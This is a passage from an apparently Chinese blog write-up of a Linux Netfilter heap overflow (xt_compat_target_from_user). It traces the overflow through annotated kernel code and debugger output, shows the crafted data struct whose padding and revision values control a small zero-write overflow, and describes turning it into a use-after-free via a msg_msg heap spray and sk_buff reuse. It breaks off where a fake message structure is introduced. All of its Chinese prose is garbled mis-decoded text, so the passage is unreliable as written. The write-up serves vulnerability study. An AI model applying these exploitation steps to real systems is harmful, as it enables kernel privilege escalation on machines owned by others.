<li><p>å‚æ•°ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(struct compat_ipt_entry *e, <span class="keyword">void</span> **dstptr,</span><br><span class="line">			    <span class="keyword">unsigned</span> <span class="keyword">int</span> *size,</span><br><span class="line">			    struct xt_table_info *newinfo, <span class="keyword">unsigned</span> <span class="keyword">char</span> *base)</span><br></pre></td></tr></table></div></figure></li>
<li><p>åœ°å€ï¼šä¸å¤ªæ¸…æ¥š</p>
</li>
<li><p>ä»‹ç»ï¼š</p>
<ul>
<li><p>ä¸»è¦å…³æ³¨å˜é‡ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¼ å…¥çš„</span></span><br><span class="line"><span class="comment">//å³ä¿å­˜posçš„æ ˆåœ°å€ï¼Œå€¼ä¸ºnewinfo-&gt;entries(newinfo_addr+0x40)</span></span><br><span class="line"><span class="keyword">void</span> **dstptr;  </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *size;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_table_info</span> *<span class="title">newinfo</span>;</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure></li>
<li><p>ç›¸å…³æ“ä½œï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">compat_copy_entry_from_user(struct compat_ipt_entry *e, <span class="keyword">void</span> **dstptr,</span><br><span class="line">                            <span class="keyword">unsigned</span> <span class="keyword">int</span> *size,</span><br><span class="line">                            struct xt_table_info *newinfo, <span class="keyword">unsigned</span> <span class="keyword">char</span> *base)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="comment">//å³posåŠ ä¸Š0x70ï¼Œå€¼ä¸ºnewinfo_addr+0x40+0x70</span></span><br><span class="line">    *dstptr += <span class="keyword">sizeof</span>(struct ipt_entry);</span><br><span class="line">    *size += <span class="keyword">sizeof</span>(struct ipt_entry) - <span class="keyword">sizeof</span>(struct compat_ipt_entry);</span><br><span class="line">    xt_ematch_foreach(ematch, e)</span><br><span class="line">		xt_compat_match_from_user(ematch, dstptr, size);</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    xt_compat_target_from_user(t, dstptr, size);</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
</ul>

        <h2 id="6-xt-compat-match-from-user"   >
          <a href="#6-xt-compat-match-from-user" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-xt-compat-match-from-user" class="headerlink" title="6.xt_compat_match_from_user()"></a>6.xt_compat_match_from_user()</h2>
      <p>è¿™ä¸ªå‡½æ•°å’Œæ¥ä¸‹æ¥çš„æ¼æ´å‡½æ•°<code>xt_compat_target_from_user</code>å¯ä»¥è¯´åŸºæœ¬ä¸€è‡´ï¼Œè§‚å¯Ÿä¸‹å›¾å³å¯çœ‹åˆ°ï¼Œå…·ä½“ç”¨æ¥å¹²ä»€ä¹ˆä¸å¤ªæ¸…æ¥šï¼Œä½†æ˜¯ä½œç”¨ä¹Ÿæ˜¯ç›¸å…³çš„padå¡«å……<code>newinfo</code>ä¸Šçš„æ•°æ®ã€‚æ‰“äº†ä¸€ä¸ªå¾ªç¯<code>xt_ematch_foreach</code>ï¼Œåœ¨æˆ‘ä»¬å…³æ³¨çš„è¿™ä¸ªæ¼æ´é‡Œï¼Œå…¶ä½œç”¨å°±åªæ˜¯ä½¿å¾—<code>*dstptr + n * msize</code>ï¼Œä¹Ÿå°±æ˜¯åœ¨æˆ‘ä»¬å…³å¿ƒçš„æœ€ç»ˆå€¼ä¸º<code>newinfo_addr+0x40+0x70+n * msize</code>ï¼Œä»è€Œä½¿å¾—åœ¨è¿›å…¥<code>xt_compat_target_from_user</code>ä¹‹å‰ï¼Œ<code>*dstptr</code>ä¸Šçš„å †å—åœ°å€å·²ç»ç§»åŠ¨åˆ°æœ«å°¾äº†ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/Img/image-20220507214923917.png" alt="image-20220507214923917" style="zoom: 80%;" />        <img src="https://pig-007.oss-cn-beijing.aliyuncs.com/Img/image-20220507214947982.png" alt="image-20220507214947982" style="zoom: 80%;" /></p>
<p>åšäº†ä¸€ä¸ªæ•°æ®å¯¹æ¯”ï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">newinfoï¼š				0xffff888006a2a000</span><br><span class="line">tï¼š						0xffff888006a2afda</span><br><span class="line">t-&gt;dataï¼š				0xffff888006a2affa</span><br><span class="line">target-&gt;targetsizeï¼š		0x4</span><br><span class="line">dstptrï¼š</span><br><span class="line">	xt_compat_match_from_userçš„æ—¶å€™ï¼š</span><br><span class="line">		0xffffc900002b7ad0-&gt;0xffff888006a2a0b0</span><br><span class="line">	xt_compat_target_from_userçš„æ—¶å€™ï¼š</span><br><span class="line">		0xffffc900002b7ad0-&gt;0xffff888006a2afda</span><br></pre></td></tr></table></div></figure>

<p>ä¹Ÿå°±æ˜¯è¯´ç»è¿‡<code>xt_compat_match_from_user</code>å‡½æ•°ä¹‹åï¼Œä¿å­˜åœ¨<code>*dstptr</code>ä¸Šçš„æ¼æ´å †çš„åœ°å€å·²ç»åŠ ä¸Šäº†<code>0xf2a</code>ã€‚</p>

        <h2 id="6-xt-compat-target-from-user"   >
          <a href="#6-xt-compat-target-from-user" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-xt-compat-target-from-user" class="headerlink" title="6.xt_compat_target_from_user()"></a>6.xt_compat_target_from_user()</h2>
      <p>ç»ˆäºæ¥åˆ°æœ€åçš„æ¼æ´å‡½æ•°</p>
<ul>
<li><p>å‚æ•°ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(struct xt_entry_target *t, <span class="keyword">void</span> **dstptr,</span><br><span class="line">				<span class="keyword">unsigned</span> <span class="keyword">int</span> *size)</span><br></pre></td></tr></table></div></figure></li>
<li><p>åœ°å€ï¼š<code>0xFFFFFFFF81A82F75</code></p>
</li>
<li><p>ä»‹ç»ï¼š</p>
<ul>
<li><p>ä¸»è¦å…³æ³¨å˜é‡</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¼ å…¥çš„</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_target</span> *<span class="title">t</span>;</span></span><br><span class="line"><span class="keyword">void</span> **dstptr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *size;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è‡ªå®šä¹‰çš„</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">xt_target</span> *<span class="title">target</span> =</span> t-&gt;u.kernel.target;</span><br><span class="line"><span class="keyword">int</span> pad, off = xt_compat_target_offset(target);</span><br></pre></td></tr></table></div></figure></li>
<li><p>ç›¸å…³æ“ä½œï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xt_compat_target_from_user</span><span class="params">(struct xt_entry_target *t, <span class="keyword">void</span> **dstptr,</span></span></span><br><span class="line"><span class="params"><span class="function">				<span class="keyword">unsigned</span> <span class="keyword">int</span> *size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">xt_target</span> *<span class="title">target</span> =</span> t-&gt;u.kernel.target;</span><br><span class="line">	<span class="keyword">int</span> pad, off = xt_compat_target_offset(target);</span><br><span class="line">	<span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//å³è·å–æŒ‡é’ˆä¸ºnewinfo+0x40+0x70+0xf2a</span></span><br><span class="line">	t = *dstptr;</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//è¿›è¡Œ8å­—èŠ‚å¯¹é½</span></span><br><span class="line">	pad = XT_ALIGN(target-&gt;targetsize) - target-&gt;targetsize;</span><br><span class="line">	<span class="keyword">if</span> (pad &gt; <span class="number">0</span>)</span><br><span class="line">        <span class="comment">//target-&gt;targetsizeä¸º4ï¼Œåˆ™æœ€ç»ˆä¼ å…¥çš„åœ°å€ä¸º</span></span><br><span class="line">        <span class="comment">//newinfo+0x40+0x70+0xf2a+0x20+0x4=newinfo+0xffe</span></span><br><span class="line">        <span class="comment">//åŒæ—¶padåœ¨ç»è¿‡å¯¹é½ä¹‹åä¹Ÿä¸º4,é‚£ä¹ˆå°±æº¢å‡º2ä¸ªå­—èŠ‚</span></span><br><span class="line">		<span class="built_in">memset</span>(t-&gt;data + target-&gt;targetsize, <span class="number">0</span>, pad);</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
</ul>

        <h2 id="æ€»ç»“-1"   >
          <a href="#æ€»ç»“-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2>
      <p>é€šè¿‡ä¸Šè¿°åˆ†æå¯ä»¥çœ‹åˆ°ï¼Œå…¶å®è¯¥æ¼æ´çš„æˆå› å°±æ˜¯</p>

        <h3 id="1-æ§åˆ¶å †å—å¤§å°å’Œåç§»"   >
          <a href="#1-æ§åˆ¶å †å—å¤§å°å’Œåç§»" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ§åˆ¶å †å—å¤§å°å’Œåç§»" class="headerlink" title="(1)æ§åˆ¶å †å—å¤§å°å’Œåç§»"></a>(1)æ§åˆ¶å †å—å¤§å°å’Œåç§»</h3>
      <p>é€šè¿‡æ§åˆ¶ä¼ å…¥çš„<code>&amp;data</code>ä¸­çš„<code>pad</code>çš„å¤§å°æ¥æ§åˆ¶ç”³è¯·çš„å †å—çš„å¤§å°å’Œ<code>t-&gt;data</code>çš„ç›¸å¯¹åç§»åœ°å€</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((__<span class="title">packed__</span>)) &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ipt_replace</span> <span class="title">replace</span>;</span>         <span class="comment">// 0x60</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ipt_entry</span> <span class="title">entry</span>;</span>            <span class="comment">// 0x70</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_match</span> <span class="title">match</span>;</span>         <span class="comment">// 0x20</span></span><br><span class="line">  <span class="keyword">char</span> pad[<span class="number">0x108</span> + PRIMARY_SIZE - <span class="number">0x200</span> - <span class="number">0x2</span>];     </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_target</span> <span class="title">target</span>;</span>      <span class="comment">// 0x20</span></span><br><span class="line">&#125; data = &#123;<span class="number">0</span>&#125;;</span><br></pre></td></tr></table></div></figure>

<p>ä¾‹å­ï¼š</p>
<p>æ¯”å¦‚bsauceå¸ˆå‚…æä¾›çš„EXPä¸­çš„padå¦‚ä¸‹ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯<code>kmalloc-4096</code>ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> pad[<span class="number">0x108</span> + PRIMARY_SIZE - <span class="number">0x200</span> - <span class="number">0x2</span>]; </span><br></pre></td></tr></table></div></figure>

<p>é‚£ä¹ˆæˆ‘ä»¬å°è¯•ä½¿ç”¨<code>kmalloc-2048</code>ï¼Œåœ¨ä»£ç ä¸­å‡å»0x800å¾—åˆ°å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> pad[<span class="number">0x108</span> + PRIMARY_SIZE - <span class="number">0x200</span> - <span class="number">0x2</span> - <span class="number">0x800</span>];</span><br></pre></td></tr></table></div></figure>

<p>æ–­ç‚¹æ‰“åœ¨<code>xt_alloc_table_info</code>ï¼Œåœ¨ç¬¬äºŒæ¬¡çš„<code>xt_alloc_table_info</code>ç”³è¯·æ¼æ´å †å—å¤„ï¼ŒæŸ¥çœ‹ä¸‹CPU0çš„<code>kmalloc-2048</code>ä¸­<code>freelist</code>ä¸­çš„å †å—ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508200120767.png" alt="image-20220508200120767"></p>
<p>ç„¶å<code>finish</code>å½“å‰å‡½æ•°ï¼ŒæŸ¥çœ‹raxç”³è¯·åˆ°çš„å †å—ï¼Œå³ä¸º<code>freelist</code>ä¸­çš„ç¬¬ä¸€ä¸ªå †å—</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508200155851.png" alt="image-20220508200155851"></p>
<p>å¯ä»¥çœ‹åˆ°æ˜¯ä»CP0çš„<code>kmalloc-2048</code>ä¸­ç”³è¯·å¾—åˆ°çš„ï¼Œä¹‹ååœ¨<code>call memset</code>çš„æ¼æ´ç‚¹æ‰“ä¸‹æ–­ç‚¹ï¼ŒæŒ‰cç»§ç»­è¿è¡Œï¼Œæ–­ä¸‹æ¥</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508200407354.png" alt="image-20220508200407354"></p>
<p>å¯ä»¥çœ‹åˆ°ä»ç„¶è¿˜æ˜¯è¯¥æ¼æ´å †å—ï¼Œå¹¶ä¸”ç›¸å…³çš„åœ°å€ä¹Ÿç±»ä¼¼çš„ï¼Œpadä¸º0x4ï¼Œæ‰€ä»¥è¿˜æ˜¯å­˜åœ¨æ¼æ´ç‚¹çš„ã€‚</p>
<p>ä¸è¿‡å…·ä½“çš„ç»†èŠ‚æœ‰ç‚¹ä¸å¤ªæ¸…æ¥šï¼Œåç»­è¿˜å¾—è¡¥ä¸€è¡¥<code>Netfilter</code>çš„ç›¸å…³çŸ¥è¯†ã€‚</p>

        <h3 id="2-æ§åˆ¶å¡«å……pad"   >
          <a href="#2-æ§åˆ¶å¡«å……pad" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ§åˆ¶å¡«å……pad" class="headerlink" title="(2)æ§åˆ¶å¡«å……pad"></a>(2)æ§åˆ¶å¡«å……pad</h3>
      <p>é€šè¿‡æ§åˆ¶ä¼ å…¥çš„<code>data.target.u.user.revision</code>æ¥æ§åˆ¶<code>target-&gt;targetsize</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data.target.u.user.revision = <span class="number">1</span>;</span><br></pre></td></tr></table></div></figure>

<p>ä¸åŒçš„<code>version</code>æ§åˆ¶ä¸åŒçš„<code>target-&gt;targetsize</code>ã€‚</p>
<p>è¿™é‡Œç»è¿‡æˆ‘è‡ªå·±çš„å®é™…è°ƒè¯•ï¼Œæ„Ÿè§‰bsauceå¸ˆå‚…è¯´çš„æœ‰ç‚¹å°é—®é¢˜ã€‚æ¼æ´ç‚¹åº”è¯¥æ˜¯å‡ºåœ¨ä¸Šè¿°çš„<code>t-&gt;daii</code>åœ°å€æ²¡æœ‰0x8å¯¹é½çš„æ—¶å€™ï¼Œå¹¶ä¸”<code>target-&gt;size</code>ä¹Ÿæ²¡æœ‰0x8å¯¹é½çš„æƒ…å†µä¸‹ã€‚</p>
<p>æ­¤å¤–ï¼Œä¸åº”è¯¥åªæ˜¯2å­—èŠ‚æº¢å‡ºï¼Œæœ€å¤šåº”è¯¥å¯ä»¥åˆ°è¾¾4å­—èŠ‚æº¢å‡ºï¼Œå¦‚ä¸‹è®¾ç½®</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> pad[<span class="number">0x108</span> + PRIMARY_SIZE - <span class="number">0x200</span> - <span class="number">0x2</span> + <span class="number">0x2</span>]; </span><br></pre></td></tr></table></div></figure>

<p>è¿™æ ·å¯ä»¥æº¢å‡º4ä¸ªå­—èŠ‚å†™0ï¼Œæœ€ç»ˆæ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508204003227.png" alt="image-20220508204003227"></p>
<p>å¦‚æœå†åŠ padçš„è¯å°±ä¼šå¯¼è‡´ç”³è¯·å‡º<code>kmalloc-8192</code>çš„å †å—äº†</p>

        <h1 id="äºŒã€æ¼æ´åˆ©ç”¨"   >
          <a href="#äºŒã€æ¼æ´åˆ©ç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒã€æ¼æ´åˆ©ç”¨" class="headerlink" title="äºŒã€æ¼æ´åˆ©ç”¨"></a>äºŒã€æ¼æ´åˆ©ç”¨</h1>
      
        <h2 id="1-æº¢å‡ºè½¬åŒ–UAF"   >
          <a href="#1-æº¢å‡ºè½¬åŒ–UAF" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æº¢å‡ºè½¬åŒ–UAF" class="headerlink" title="1.æº¢å‡ºè½¬åŒ–UAF"></a>1.æº¢å‡ºè½¬åŒ–UAF</h2>
      <p>è¿™é‡Œæ¶‰åŠåˆ°ä¹‹å‰æåˆ°çš„<code>msg_msg</code>ç»“æ„ä½“åˆ©ç”¨ã€‚</p>

        <h3 id="1-å †å–·å†…å­˜å¸ƒå±€"   >
          <a href="#1-å †å–·å†…å­˜å¸ƒå±€" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å †å–·å†…å­˜å¸ƒå±€" class="headerlink" title="(1)å †å–·å†…å­˜å¸ƒå±€"></a>(1)å †å–·å†…å­˜å¸ƒå±€</h3>
      <p>é¦–å…ˆä½¿ç”¨<code>msgget</code>ç”³è¯·å¤šä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œç„¶åå¾€æ¯ä¸ªæ¶ˆæ¯é˜Ÿåˆ—å‘é€ä¸¤æ¡æ¶ˆæ¯ï¼Œä¸€æ¡ä¸»æ¶ˆæ¯<code>0x1000</code>ï¼Œä¸€æ¡è¾…åŠ©æ¶ˆæ¯<code>0x400</code>ã€‚è¿™é‡Œå‘é€æ¶ˆæ¯æ—¶éœ€è¦æ³¨æ„ä¸‹ï¼Œå…ˆéå†æ¯ä¸ªé˜Ÿåˆ—å‘é€ä¸»æ¶ˆæ¯ï¼Œç„¶åå†éå†æ¯ä¸ªé˜Ÿåˆ—å‘é€è¾…åŠ©æ¶ˆæ¯ã€‚è¿™æ ·è¿›è¡Œå †å–·æ„é€ åï¼Œå…¶ä¸­å°±ä¼šæœ‰éƒ¨åˆ†çš„æ¶ˆæ¯é˜Ÿåˆ—ä¸­çš„ä¸»æ¶ˆæ¯è¿æˆä¸€æ•´å—åœ°å€è¿ç»­çš„å†…å­˜ï¼Œ<strong>è¾…åŠ©æ¶ˆæ¯ä¹Ÿéœ€è¦åœ°å€è¿æˆä¸€æ•´å—ï¼Œæ–¹ä¾¿åç»­æ³„éœ²åœ°å€ï¼Œä½†æ˜¯è¿™é‡Œä¸ºäº†å¥½çœ‹å°±æ²¡æœ‰è¿ä¸€èµ·</strong>ã€‚æ¯”å¦‚è¿™é‡Œç”³è¯·ä¸‰ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œæœ€ç»ˆå½¢æˆç±»ä¼¼çš„å¦‚ä¸‹å¸ƒå±€</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513110107919.png" alt="image-20220513110107919"></p>
<p>å½“ç„¶è¿™é‡Œæ¯æ¡<code>0x1000</code>çš„ä¸»æ¶ˆæ¯ä¸­è¿˜æœ‰å‡ ä¸ª<code>struct msg_msgseg*</code>æ²¡æœ‰ç”»å‡ºæ¥</p>

        <h3 id="2-æ¼æ´æº¢å‡ºæ„é€ UAF"   >
          <a href="#2-æ¼æ´æº¢å‡ºæ„é€ UAF" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ¼æ´æº¢å‡ºæ„é€ UAF" class="headerlink" title="(2)æ¼æ´æº¢å‡ºæ„é€ UAF"></a>(2)æ¼æ´æº¢å‡ºæ„é€ UAF</h3>
      <p>è¿™é‡Œæˆ‘ä»¬å…ˆé‡Šæ”¾ä¾‹å­ä¸­çš„ç¬¬äºŒæ¡ä¸»æ¶ˆæ¯ï¼Œè™½è¯´åœ¨ä¸»æ¶ˆæ¯ä¸­æ˜¯ç”±4ä¸ª<code>kmalloc(0x400)</code>ç”³è¯·å‡ºæ¥çš„4ä¸ªå †å—ï¼Œä½†æ˜¯å¦‚æœéƒ½é‡Šæ”¾ä¹‹åï¼Œå†…å­˜çš„å›æ”¶æœºåˆ¶å‘ç°è¿™å››ä¸ªåœ°å€è¿ç»­ä¸”éƒ½è¢«é‡Šæ”¾ï¼Œé‚£ä¹ˆå°±ä¼šå½’å¹¶æˆä¸€é¡µ<code>page</code>è¿˜ç»™<code>Slub</code>åˆ†é…å™¨ï¼Œå…¶å®å°±æ˜¯<code>kmalloc-4096</code>ã€‚ï¼ˆé‡Œé¢ç®—æ³•å¾ˆå¤æ‚ï¼Œä¸æ˜¯å¾ˆæ‡‚ï¼Œåé¢å†æ¥ç†æ¸…æ¥šã€‚ï¼‰ä¹‹åå†ç”³è¯·<code>0x1000</code>å¤§å°çš„å †å—ï¼Œå°±ä¼šä¼˜å…ˆä»è¿™é‡Œå–ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513110346186.png" alt="image-20220513110346186"></p>
<p>ç„¶åæˆ‘ä»¬ä½¿ç”¨æ¼æ´ï¼Œè°ƒç”¨<code>socketopt</code>æ¥ç”³è¯·ä¸€ä¸ª<code>0x1000</code>çš„<code>xt_table_info</code>ï¼Œå°±ä¼šå æ®åˆ°æˆ‘ä»¬åˆšåˆšé‡Šæ”¾çš„<code>0x1000</code>å¤§å°çš„å †å—ä¸Šã€‚(è¿™ä¸ªå‰é¢æˆ‘ä»¬åˆ†æ<code>socketopt</code>ä¼šç”³è¯·ä¸¤ä¸ª<code>0x1000</code>å¤§å°çš„å †å—ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¹‹åå°±æ˜¯å¤šé‡Šæ”¾å‡ æ¡ä¸»æ¶ˆæ¯å³å¯)è¿™æ ·åœ¨å æ®ä¹‹åï¼Œå‘ç”Ÿ2å­—èŠ‚æº¢å‡ºå†™0ï¼Œå°±å¯ä»¥æº¢å‡ºåˆ°ä¸‹ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—çš„<code>msg_msg</code>å¤´éƒ¨ç»“æ„çš„<code>struct list_head m_list.next</code>æŒ‡é’ˆï¼Œä»è€Œä½¿å¾—å…¶æŒ‡å‘å…¶ä»–ä½ç½®ï¼Œå¦‚æœè¿æ°”å¥½çš„è¯ï¼Œç”±äºè¾…åŠ©æ¶ˆæ¯ä¹Ÿæ˜¯å †å–·å½¢å¼ï¼Œä¸”å¤§å°ä¸º<code>0x400</code>ï¼Œé‚£ä¹ˆæº¢å‡ºä¸¤å­—èŠ‚å†™0å°±å¯èƒ½å°†è¯¥<code>next</code>æŒ‡é’ˆæŒ‡å‘å…¶ä»–çš„è¾…åŠ©æ¶ˆæ¯ï¼Œä»è€Œé€ æˆä¸¤ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸­å…±å­˜ä¸€ä¸ªè¾…åŠ©æ¶ˆæ¯ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513110927931.png" alt="image-20220513110927931"></p>
<p>æ¯”å¦‚å›¾ä¸­æ¶ˆæ¯é˜Ÿåˆ—3ä¸­çš„ä¸»æ¶ˆæ¯å¤´éƒ¨çš„<code>struct list_head m_list.next</code>å³è¢«ä¿®æ”¹(é»‘è‰²ä¸ºæº¢å‡º2å­—èŠ‚å†™0)ï¼Œå¦‚çº¢è‰²ç®­å¤´æ‰€ç¤ºæŒ‡å‘äº†æ¶ˆæ¯é˜Ÿåˆ—1ä¸­çš„è¾…åŠ©æ¶ˆæ¯ï¼Œè¿™æ ·æ¶ˆæ¯é˜Ÿåˆ—1å’Œæ¶ˆæ¯é˜Ÿåˆ—3éƒ½æŒ‡å‘äº†åŒä¸€ä¸ªè¾…åŠ©æ¶ˆæ¯ï¼Œæ„æˆäº†å †å—<code>overlap</code>ã€‚ä¹‹åæˆ‘ä»¬é‡Šæ”¾æ¶ˆæ¯é˜Ÿåˆ—1ä¸­çš„è¾…åŠ©æ¶ˆæ¯ï¼Œè€Œæ¶ˆæ¯é˜Ÿåˆ—3ä»ç„¶æŒ‡å‘è¯¥è¾…åŠ©æ¶ˆæ¯ï¼Œæ„æˆäº†UAFã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513111337456.png"></p>
<p>ğŸ”ºæ³¨ï¼šåœ¨å®é™…çš„åˆ©ç”¨é‡Œï¼Œéœ€è¦è¿›è¡Œå †å–·å¸ƒå±€ï¼Œç”³è¯·å¾ˆå¤šçš„æ¶ˆæ¯é˜Ÿåˆ—ï¼Œè¿™æ—¶å€™å°±éœ€è¦ç”¨<code>MSG_COPY</code>æ ‡å¿—ä½æ¥è¿›è¡Œæ¶ˆæ¯è¯»å–ã€‚åˆ©ç”¨æ­¤æ ‡å¿—ä½è¯»å–æ¶ˆæ¯ä½†ä¸é‡Šæ”¾å †å—ï¼Œç„¶åå€ŸåŠ©å‘é€æ¶ˆæ¯æ—¶è‡ªå·±ç•™ä¸‹çš„ç´¢å¼•æ ‡å¿—æ¥åˆ¤æ–­åˆ°åº•æ˜¯å“ªä¸ªè¾…åŠ©æ¶ˆæ¯è¢«ä¸¤ä¸ªæ¶ˆæ¯é˜Ÿåˆ—æ‰€åŒ…å«ï¼Œè¿™æ ·å°±èƒ½è¿›è¡Œåç»­çš„åˆ©ç”¨ã€‚</p>

        <h2 id="2-åˆ©ç”¨UAF"   >
          <a href="#2-åˆ©ç”¨UAF" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-åˆ©ç”¨UAF" class="headerlink" title="2.åˆ©ç”¨UAF"></a>2.åˆ©ç”¨UAF</h2>
      
        <h3 id="1-æ³„éœ²å †åœ°å€"   >
          <a href="#1-æ³„éœ²å †åœ°å€" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ³„éœ²å †åœ°å€" class="headerlink" title="(1)æ³„éœ²å †åœ°å€"></a>(1)æ³„éœ²å †åœ°å€</h3>
      <p>é¦–å…ˆä½¿ç”¨<code>sk_buff</code>çš„<code>data</code>æ•°æ®å—æ¥å æ®è¯¥<code>UAF</code>å †å—ã€‚å‰é¢æåˆ°<code>sk_buff</code>çš„ç»“æ„å¤´ä½¿ç”¨ç‹¬æœ‰çš„ç¼“å†²æ± <code>kache</code>æ¥ç”³è¯·ï¼Œä½†æ˜¯å…¶<code>data</code>æ•°æ®å—è¿˜æ˜¯ä½¿ç”¨<code>kmalloc</code>å¸¸è§„è·¯çº¿æ¥ç”³è¯·é‡Šæ”¾(ä½¿ç”¨æ­£å¸¸çš„å‘åŒ…æ”¶åŒ…å³å¯å®Œæˆç”³è¯·é‡Šæ”¾)ï¼Œå¹¶ä¸”<code>size</code>å’Œ<code>data</code>å†…å®¹å®Œå…¨å¯æ§ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å®Œå…¨æ§åˆ¶è¯¥<code>UAF</code>å †å—ã€‚</p>
<p>ä¹‹åä¼ªé€ ä¸€ä¸ª<code>fake_msg_msg</code>ç»“æ„ä½“ï¼Œç»“æ„å¦‚ä¸‹</p>
